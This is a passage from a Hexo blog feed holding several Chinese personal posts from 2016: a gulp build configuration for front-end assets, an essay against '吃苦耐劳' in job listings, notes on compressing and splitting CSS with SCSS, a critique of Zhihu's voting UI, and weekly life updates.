gulpfile.js</span><br></pre></td></tr></table></figure></p><p>npm的小trick：<br><code>i</code>是<code>install</code>的缩写<br><code>-D</code>是<code>--save-dev</code>的缩写</p><h2 id="gulp配置文件"><a href="#gulp配置文件" class="headerlink" title="gulp配置文件"></a>gulp配置文件</h2><p>上面的命令执行之后应该就直接打开编辑器了<br>填下面的内容<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">var gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>),</span><br><span class="line">    D = new Date(),</span><br><span class="line">    sass = <span class="built_in">require</span>(<span class="string">'gulp-sass'</span>),</span><br><span class="line">    <span class="built_in">concat</span> = <span class="built_in">require</span>(<span class="string">'gulp-concat'</span>),</span><br><span class="line">    concatCss = <span class="built_in">require</span>(<span class="string">'gulp-concat-css'</span>),</span><br><span class="line">    cleanCSS = <span class="built_in">require</span>(<span class="string">'gulp-clean-css'</span>),</span><br><span class="line">    uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>),</span><br><span class="line">    merge = <span class="built_in">require</span>(<span class="string">'gulp-merge-link'</span>),</span><br><span class="line">    zip = <span class="built_in">require</span>(<span class="string">'gulp-zip'</span>),</span><br><span class="line">    imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>),</span><br><span class="line">    connect = <span class="built_in">require</span>(<span class="string">'gulp-connect'</span>),</span><br><span class="line">    connect = <span class="built_in">require</span>(<span class="string">'gulp-connect'</span>),</span><br><span class="line">    gulpOpen = <span class="built_in">require</span>(<span class="string">'gulp-open'</span>),</span><br><span class="line">    uncss = <span class="built_in">require</span>(<span class="string">'gulp-uncss'</span>)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'sass'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/css/*.scss'</span>)</span><br><span class="line">        .pipe(sass().on(<span class="string">'error'</span>, sass.logError))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'app/css'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'sass:watch'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gulp.watch(<span class="string">'app/css/*.scss'</span>, [<span class="string">'sass'</span>])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'mergejs'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/js/*.js'</span>)</span><br><span class="line">        .pipe(<span class="built_in">concat</span>(<span class="string">'merged.js'</span>))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'app'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'mergecss'</span>, [<span class="string">'sass'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/css/*.css'</span>)</span><br><span class="line">        .pipe(concatCss(<span class="string">"merged.css"</span>))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'app'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'minicss'</span>, [<span class="string">'mergecss'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/merged.css'</span>)</span><br><span class="line">#         .pipe(uncss(&#123;</span><br><span class="line">            html: [<span class="string">'app/*.html'</span>]</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(cleanCSS(&#123; compatibility: <span class="string">'ie8'</span> &#125;))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'DIST'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'minijs'</span>, [<span class="string">'mergejs'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/merged.js'</span>)</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'DIST'</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'merge'</span>, [<span class="string">'minicss'</span>, <span class="string">'minijs'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/index.html'</span>)</span><br><span class="line">        .pipe(merge(&#123;</span><br><span class="line">            <span class="string">'merged.css'</span>: [<span class="string">'css/*.css'</span>],</span><br><span class="line">            <span class="string">'merged.js'</span>: [<span class="string">'js/*.js'</span>]</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'DIST'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'zip'</span>, [<span class="string">'merge'</span>, <span class="string">'miniimg'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'DIST/**'</span>])</span><br><span class="line">        .pipe(zip(D.toLocaleString() + <span class="string">'.zip'</span>))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'miniimg'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'app/img/*'</span>)</span><br><span class="line">        .pipe(imagemin())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'DIST/img'</span>))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'reload'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'app/*.html'</span>, <span class="string">'app/js/*.js'</span>, <span class="string">'app/css/*.scss'</span>, <span class="string">'app/img/*'</span>])</span><br><span class="line">        .pipe(connect.reload());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'build'</span>, [<span class="string">'sass'</span>, <span class="string">'mergejs'</span>, <span class="string">'mergecss'</span>, <span class="string">'minijs'</span>, <span class="string">'minicss'</span>, <span class="string">'merge'</span>, <span class="string">'miniimg'</span>, <span class="string">'zip'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">'building files'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'web'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    connect.server(&#123;</span><br><span class="line">        port: <span class="number">8878</span>,</span><br><span class="line">        livereload: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    gulp.src([<span class="string">'app/index.html'</span>])</span><br><span class="line">        .pipe(gulpOpen(&#123;</span><br><span class="line">            uri: <span class="string">'http://localhost:8878/app'</span></span><br><span class="line">        &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'watch'</span>, [<span class="string">'web'</span>, <span class="string">'sass'</span>], <span class="function"><span class="keyword">function</span><span class="params">()</span></span> &#123;</span><br><span class="line">    gulp.watch(<span class="string">'app/css/*.scss'</span>, [<span class="string">'sass'</span>, <span class="string">'reload'</span>])</span><br><span class="line">    gulp.watch(<span class="string">'app/js/*.js'</span>, [<span class="string">'reload'</span>])</span><br><span class="line">    gulp.watch(<span class="string">'app/img/*'</span>, [<span class="string">'reload'</span>])</span><br><span class="line">    gulp.watch(<span class="string">'app/*.html'</span>, [<span class="string">'reload'</span>])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'web'</span>]);</span><br></pre></td></tr></table></figure></p><p>在这里我不解释命令有什么作用，<br>这篇文章里，你只用知道使用方法和后果。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">gulp</span> <span class="keyword">build</span></span><br><span class="line"><span class="keyword">gulp </span>watch</span><br></pre></td></tr></table></figure><p><code>gulp watch</code>会打开本地服务器预览<code>app/index.html</code>文件，然后监听<code>scss</code>，<code>js</code>，<code>img(文件夹内容)</code>，<code>html</code>的改变实时更新浏览器。  </p><p><code>gulp build</code>则会合并<code>js</code>和<code>css</code>，然后在html中替换原有的对资源的多个请求，然后压缩img文件夹中的图片，复制到DIST文件夹中，最后压缩该文件夹，压缩文件名为执行时间。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>吃苦耐劳</title>
      <link href="/2016/06-14-hardwork/"/>
      <url>/2016/06-14-hardwork/</url>
      
        <content type="html"><![CDATA[<p>又看到「吃苦耐劳」这个词了。<br>私以为这不是什么好事，是封建残余。  </p><hr><h2 id="看不惯的"><a href="#看不惯的" class="headerlink" title="看不惯的"></a>看不惯的</h2><p>公司招聘的时候，时常能看见这一条标准。我们经常看到，还真以为这是某一种美德了。吃苦是人做自己不愿意做的事情，耐劳是事情多却不抱怨。</p><p>一个自由人有选择自己想做的事情的自由，当然也有选择做自己不想做的事情的自由。对于这种明知道要吃苦的还继续坚持的人，我<em>希望</em>我能带着怜悯的眼光去看他。</p><p>热爱工作，就不会有苦，除非有人强加于你。同理，什么样的工作会要求你做事多又不能抱怨呢？我能想到的只有基层的工作了，而且，环境总在引导我去认为「基层的工作是道德上至高无上的」。放屁。</p><p>想起黑哥面试的时候，问到别人单位的薪资怎么样，人家的回答是<strong>「如果你抱着这样的心态来问，我看你还是不要来我们公司了」</strong>。</p><p>然后黑哥说「没有没有，我就是这么随便一问」。</p><hr><h2 id="如果是我"><a href="#如果是我" class="headerlink" title="如果是我"></a>如果是我</h2><p>「我工作就是为了钱，如果你不给钱我一定不会来；如果暂时拿不到，我希望在将来拿到更多。」</p><p>凭什么一个公司有底气嘲讽询问薪资的潜在员工。互相尊重这种事情都做不到，什么公司会找去当HR。我能想到的只有国企了，而且，环境总在引导我去认为「国企的工作在道德上是无限正义的」。放屁。</p><p>如果我的工作要求我吃苦耐劳，我应该是要想一下是不是自己有点太差了，或许不知不觉就混到了自己都看不下去的程度。</p><p>然后可能就是考虑再就业的问题了把~</p><hr><p><strong>想看的看，不想看的就别看</strong><br>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>压缩Css的一个想法</title>
      <link href="/2016/06-10-css-sgweez/"/>
      <url>/2016/06-10-css-sgweez/</url>
      
        <content type="html"><![CDATA[<p>本篇写于这个压缩css自动化工具完成之前，暂时记录一下想法，不保证完成，想看的看，不想看的就别看。</p><hr><h2 id="css的原理"><a href="#css的原理" class="headerlink" title="css的原理"></a>css的原理</h2><p>css的声明是由<code>选择器</code>和<code>声明语句</code>一同构成的，下面写了两个声明的语句：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">300</span>;</span><br><span class="line"><span class="attribute">box-sizing</span>: border-box</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.sec2</span> <span class="selector-class">.wrapper</span> <span class="selector-class">.pt1</span> <span class="selector-class">.title</span> &#123;</span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">300</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">56px</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>css可以将相同的<code>声明语句</code>提出来写在一起，上下这两段的功能相同： </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>, <span class="selector-class">.sec2</span> <span class="selector-class">.wrapper</span> <span class="selector-class">.pt1</span> <span class="selector-class">.title</span> &#123;</span><br><span class="line"><span class="attribute">font-weight</span>: <span class="number">300</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">box-sizing</span>: border-box</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.sec2</span> <span class="selector-class">.wrapper</span> <span class="selector-class">.pt1</span> <span class="selector-class">.title</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">56px</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="压缩的基本原理"><a href="#压缩的基本原理" class="headerlink" title="压缩的基本原理"></a>压缩的基本原理</h2><p>从上面能知道css提出相同<code>声明语句</code>后的功能相同，以此在特定的条件下可以减少css的总大小。  </p><p>但是在什么时候可以减少呢?考虑到选择器的个数，非共同语句的个数，以及个别一个选择器对应一个语句的情况，还是交给程序，先统统缩写，减少了就确定写入，没减少就不写。</p><p>另，配合js可以做到替换html和css中的所有class选择器，以做到最少化。</p><p>然而这一过程是不可逆的。显然只有在发布版本上适用这一功能。</p><hr><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol><li>将css文件变为<code>一个声明</code>对应<code>数个选择器</code>的字典</li><li>按声明语句排序，手动改相似的语句，这样可以有效进一步减少css总大小</li><li>遍历字典中每一条，判断简写是否有效，并写入</li><li>在css和html中改动所有class选择器</li></ol><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么 06-04</title>
      <link href="/2016/06-04-whatsup20160604/"/>
      <url>/2016/06-04-whatsup20160604/</url>
      
        <content type="html"><![CDATA[<p>找到了实习，最近都在那边。</p><p>基本上没有用自己的计算机，也找不到时间push给github了。看不到每天干什么还是有点吓人的，一不小心就已经周六了，莫名其妙感觉少了一天。</p><hr><h2 id="干货"><a href="#干货" class="headerlink" title="干货"></a>干货</h2><p>「分析目的」、「设计流程」、「查看原型」、「逻辑分析」、「代码」。  </p><p>私以为这个是可行的方法。注意写代码尽量减低耦合性，后面加功能的时候好受得多。  </p><p>用原生js写代码感觉就像是用乐高建跨海大桥，剩下的不做评价。  </p><p>sublime text、goagent、alfred、divvy、pixelmator、spectrum。<br>这几个是我首先安装的几个软件。sublime text 直接将 <code>application support</code> 拷贝到了对应的位置，chrome 则是可以登录，也解决了常用插件和书签同步的问题。  </p><p>ASCII（发音：英语发音：/ˈæski/ ASS-kee，American Standard Code for Information Interchange，美国信息交换标准代码）。</p><p>滴滴的快车比顺风车拼车便宜。</p><h2 id="渴望湿货"><a href="#渴望湿货" class="headerlink" title="渴望湿货"></a>渴望湿货</h2><p>个人特别喜欢「理想化的」普通生活的故事，这种故事一大特点就是「湿货多」。  </p><p>不会或很少有主观阐述强加于读者，可能这就是我喜欢的原因。<br>我散步的时候，经常会看到陌生的窗户猜想他们的生活是怎样的。『深夜食堂』就给我这种感觉。他人生活的琐事总让我感觉到舒适。  </p><p>然而作为一个青年，看到别人的阐释时常常会表现出「我不服」，至少这种感觉常产生在我身上。我使用新浪微博看新闻时，接连取消关注了「央视新闻」、「环球时报」，这俩经常向我灌输一些我不喜欢的东西。我喜欢曾经的「成都全接触」，可能就是因为看得到他人的琐事吧。  </p><p>很久没看电视了。对了好久没有回去看奶奶了，明天还不能睡懒觉，要回金鱼街吃午饭。</p><p>找个时间还是开一个小项目每天写一写嘛，不然天天contribution都是空的，看着难受。</p><hr><p>以上。<br>喜欢的看，不喜欢就别看。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>反对</title>
      <link href="/2016/05-22-down-vote/"/>
      <url>/2016/05-22-down-vote/</url>
      
        <content type="html"><![CDATA[<p>突然发现一个问题，我在使用知乎的时候，基本上只会点击表示「赞同」的那一个向上的箭头，而对于自己反对的回答，我基本上是不会去点击表示「反对」的那一个向下的箭头。</p><p>然后我问了一下小良，他会不会给不喜欢的回答点「反对」键，他说他会直接忽视自己不喜欢的那个回答。当我问到「赞同」和「反对」之间的比例时，小良的回答是「100：1」。</p><p>浅浅想了一下，大概原因是知乎将表示票数的这个数字和「赞同」箭头放在了同一个父元素中。毫无疑问，这样放，对使用者的选择肯定是有一定干预的，看看国产流氓软件的安装和卸载过程，就会明显的对你的操作进行视觉和操作难度上的干预。</p><p><img src="http://gaoryrt.com/2016/05-22-down-vote/uninstall.png" alt="猎豹免费wifi的卸载界面"></p><p>👆这两张图👇有着相同的流氓点。（截图时间为发布时间，图源猎豹免费wifi、知乎，感谢小良供图）</p><p><img src="http://gaoryrt.com/2016/05-22-down-vote/downvote.png" alt="不公平的知乎"></p><p>为什么不给一个「反对」的个数呢？那么我点击反对之后会有什么用呢？只有管理员看得到么？</p><p>我打开了几个同样具有投票元素的站点：<a href="http://stackoverflow.com/questions/30770006/dplyr-max-value-in-a-group-excluding-the-value-in-each-row" target="_blank" rel="noopener">stackoverflow</a>、 <a href="https://segmentfault.com/q/1010000005176174" target="_blank" rel="noopener">segmentefault</a>、 <a href="https://www.quora.com/Do-fathers-feel-uncomfortable-when-their-pubescent-daughters-go-out-to-the-beach-or-pool-wearing-a-bikini-Do-they-start-to-avoid-looking-once-their-daughters-start-growing-up" target="_blank" rel="noopener">quora</a>， 发现quora也是这样做的，但是另两个技术型问答网站则将票数放在了同意和反对中间。</p><p><img src="http://gaoryrt.com/2016/05-22-down-vote/e.png" alt="公平的stackoverflow"></p><p>又想起来朋友圈可以屏蔽不想看的人的相关信息，但是在微博要这样做的话你需要付费。什么时候连个人喜好这样的基本权利都需要付费才能使用了？又是什么时候连「屏蔽都要付费」这种行为都变得「不可耻」了呢？</p><p><strong>想看的看，不想看的就别看</strong></p><hr><p>想到再说</p><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最近在干什么05-21</title>
      <link href="/2016/05-21-whatsup2016-05-21/"/>
      <url>/2016/05-21-whatsup2016-05-21/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gaoryrt.com/categories/%E9%9A%8F%E7%AC%94%E4%B8%8E%E4%B8%AA%E4%BA%BA%E6%96%87%E9%9B%86/">本系列</a>的目的是避免自己感觉自己白活了。  </p><hr><p>今天是5月21日，在本月的16号，我停止了目前人生中最长的一次contribution：61天。越发感觉自己是为了commit而commit，再加之有个非个人项目需要完成，索性停止了commit。  </p><h2 id="非个人项目"><a href="#非个人项目" class="headerlink" title="非个人项目"></a>非个人项目</h2><p>一个用vue+browserify写的15选10在线APP。第一次用vueify不太熟练，加之自己js也不是强项，遇见了很多问题。比如说两个vue之间获取数据我也只能使用<code>this.$parent.$children[n].xxx</code>的形式来调用，不应该直接是<code>Vue.xxx.xx</code>这样么。还有现在也没有搞明白为什么用for定义的动态属性不能在template中使用v-for里面调用。<br>说回来MVVM真是个好东西，一个部件一个vue文件，集成template、js、css。加上vueify还可以用jade，less，ES2015。<br>然而在上传的时候把之前的git文件给覆盖了。。。不然也不会有17号的空白，残念。<br>周四就提交了，今天也没有见一个回复。我已经龊到人家不愿意回复的境界了。   </p><h2 id="写代码时听什么"><a href="#写代码时听什么" class="headerlink" title="写代码时听什么"></a>写代码时听什么</h2><p>还是写了不少行了，感觉自己在听歌的时候，尤其是熟悉的音乐时效率高得多。<br>第一个版本是个后摇的歌单，这个并不属于上面说到的「熟悉的音乐」，反而是空灵了很多。<a href="http://music.163.com/#/playlist?id=6948994" target="_blank" rel="noopener">后摇 - 代码必备</a><br>第二个版本是自己收集的nu-disco，这个也是最常用的歌单，开始循环就感觉bug都少多了。<a href="http://music.163.com/#/playlist?id=80144899" target="_blank" rel="noopener">nu-disco</a><br>最近还发现一个杂杂的歌单，杂在都是EDM但是类型挺多，大部分都算是氛围音乐吧，在工作的时候听白噪声的应该会蛮喜欢这个歌单的。<a href="http://music.163.com/#/playlist?id=59398367" target="_blank" rel="noopener">「 幻 」 Vol.3</a><br>田皮听歌居然都已经一万二千五首了，他是没有停过么。  </p><h2 id="个人项目"><a href="#个人项目" class="headerlink" title="个人项目"></a>个人项目</h2><p>等等我看看。<br><a href="https://github.com/gaoryrt/retro-404" target="_blank" rel="noopener">retro-404</a>新增了一个DOS样式的404页面。<br><img src="https://github.com/gaoryrt/retro-404/raw/master/screen-shots/dos-404.png" alt=""><br>其实还可以添加osX、nintendo的ww<br>仿照<a href="">git-the simple guide</a>写了一个<a href="http://gaoryrt.com/flex/">flex guide</a>，把小本本上最常用的那一页搬到了网上，小本本不在身边的时候也可以速查了。<br><a href="http://gaoryrt.com/flex/">flex - the simple guide</a>  </p><h2 id="接下来干什么"><a href="#接下来干什么" class="headerlink" title="接下来干什么"></a>接下来干什么</h2><p>感觉还是造轮子吧，试试用vue写日期选择的控件，轮播组件。<br>还是有目标的生活安逸啊。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>拆分CSS</title>
      <link href="/2016/05-14-splitCSS/"/>
      <url>/2016/05-14-splitCSS/</url>
      
        <content type="html"><![CDATA[<p>在我开始着手写<a href="">hexo-theme-pln</a>的时候我就已经预见到了这一幕：这个 css 文件太过巨大，对于普通的维护来说比较复杂，我需要将它拆分开来。<br>这篇文章就在进行的同时记录一下过程。<br><strong>想看的看，不想看就别看。</strong>  </p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这个css文件是这个项目中的唯一的一个 css，我需要将它根据作用分成几个部分，再为其加上变量选项，以便维护。<br>所以我需要一款可以运行在 node.js 上的，支持变量以及导入的css预处理器。<br>那么就要选择是 Less、Sass 还是 Stylus 了，关于这几个之间的比较我找到一些文章：<a href="https://css-tricks.com/sass-vs-less/" target="_blank" rel="noopener">Sass vs. LESS</a>、<a href="http://efe.baidu.com/blog/revisiting-css-preprocessors/" target="_blank" rel="noopener">再谈 CSS 预处理器</a>。<br>简单看了一下，不用游标卡尺的<a href="http://sass-lang.com" target="_blank" rel="noopener">SCSS</a>，就是你了。<br>在这之前我还需要将css文件根据DOM排序，分成几个文件。我想这个时候就不需要第三方的工具了，既然这几天在看node.js相关，其实也可以自己写一个爬虫，树状输出该页面下所有节点名。<br>那么整个过程就是下面几步：  </p><ol><li>本地安装SCSS，以及常用操作</li><li>爬到页面的树状节点名</li><li>手动拆分原css</li><li>SCSS优化</li></ol><hr><h2 id="关于SCSS"><a href="#关于SCSS" class="headerlink" title="关于SCSS"></a>关于SCSS</h2><p>私以为这个是sass的升级版，就是有了大括号和分号的sass。<br>Mac 下的安装：<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem <span class="keyword">install</span> sass</span><br></pre></td></tr></table></figure></p><p>如果不行请用<code>sudo</code>，安装完了用<code>sass -v</code>检查一下是否成功。<br>常用操作就不再累述，想看的看<a href="http://sass-lang.com/guide" target="_blank" rel="noopener">官网的介绍</a>吧，都差不多。<br>使用的话是这个：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sass</span> <span class="selector-tag">style</span><span class="selector-class">.scss</span><span class="selector-pseudo">:style.css</span></span><br></pre></td></tr></table></figure></p><p>压缩的话是这个：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sass --style compressed style<span class="selector-class">.scss</span>:style<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br></pre></td></tr></table></figure></p><hr><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><p>新建文件夹，cd进去<code>npm init</code>，然后修改<code>package.json</code>，添加上<code>&quot;private&quot;: true</code>，再确保自己写了<code>&quot;description&quot;</code>这一项之后继续，都是为了方式<code>NPM WARN</code>。<br>然后是爬虫和jquery相关的库：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> superagent cheerio <span class="comment">--save</span></span><br></pre></td></tr></table></figure></p><p>以下就是编写这个通过html获得节点列表的爬虫了。<br>好吧写了大概有三个小时我还是放弃了，这个循环的递归我还不知道怎么写呢。。。<br>一开始写的第一个版本写到后面发现需要递归。第二个版本递归写好了发现还需要循环进去。<br>或许还是我的逻辑问题，不该写<code>startSelector Return SonNodeArr</code>这么一个函数的，应该就一层接着一层，返回下一层第一个，然后下一个，直到没有下一个，直到没有下一层。<br>第一版的代码可以得到：<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="symbol">'body</span> div#main', <span class="symbol">'body</span> footer.page-footer' ]</span><br><span class="line">---------------------</span><br><span class="line">[ <span class="symbol">'body</span> div#main div.behind', <span class="symbol">'body</span> div#main div.container' ]</span><br><span class="line">[ <span class="symbol">'body</span> footer.page-footer div.clearfix',</span><br><span class="line">  <span class="symbol">'body</span> footer.page-footer div.right-foot.container',</span><br><span class="line">  <span class="symbol">'body</span> footer.page-footer div.clearfix' ]</span><br><span class="line">---------------------</span><br><span class="line">[ <span class="symbol">'body</span> div#main div.behind div.back',</span><br><span class="line">  <span class="symbol">'body</span> div#main div.behind div.description' ]</span><br><span class="line">[ <span class="symbol">'body</span> div#main div.container nav.navigator',</span><br><span class="line">  <span class="symbol">'body</span> div#main div.container ul.posts',</span><br><span class="line">  <span class="symbol">'body</span> div#main div.container ul.pager' ]</span><br><span class="line"><span class="literal">[]</span></span><br><span class="line">[ <span class="symbol">'body</span> footer.page-footer div.right-foot.container a.backtop.wow.fadeIn.animated',</span><br><span class="line">  <span class="symbol">'body</span> footer.page-footer div.right-foot.container a' ]</span><br><span class="line"><span class="literal">[]</span></span><br></pre></td></tr></table></figure></p><p>我加了两个横线之后可以看到，1 -&gt; 2 -&gt; 5 